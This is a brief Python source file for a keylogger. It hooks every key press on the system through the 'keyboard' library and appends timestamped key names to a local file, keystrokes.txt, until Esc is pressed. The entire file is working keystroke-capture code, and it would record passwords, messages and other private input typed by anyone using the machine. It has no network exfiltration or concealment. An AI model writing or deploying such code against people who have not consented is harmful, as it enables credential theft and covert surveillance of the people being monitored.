import keyboard
import datetime

class Keylogger:
    def __init__(self):
        self.keystrokes = []
        # self.start_logging()

    def save_keystrokes(self):
        if self.keystrokes:
            current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open('keystrokes.txt', 'a') as f:
                for key in self.keystrokes:
                    f.write(f"{current_time} - {key}\n")
            self.keystrokes.clear()

    def on_key(self, event):
        if event.event_type == keyboard.KEY_DOWN:  # Capture only key press events
            key = event.name
            self.keystrokes.append(key)
            if key == 'space' or key == 'enter':
                self.save_keystrokes()

    def start_logging(self):
        keyboard.hook(self.on_key)
        try:
            keyboard.wait('esc')  # Wait for the user to press 'esc' to exit
        except KeyboardInterrupt:
            pass
        finally:
            self.save_keystrokes()  # Save any remaining keystrokes before exiting
            keyboard.unhook_all()  # Unhook the keyboard event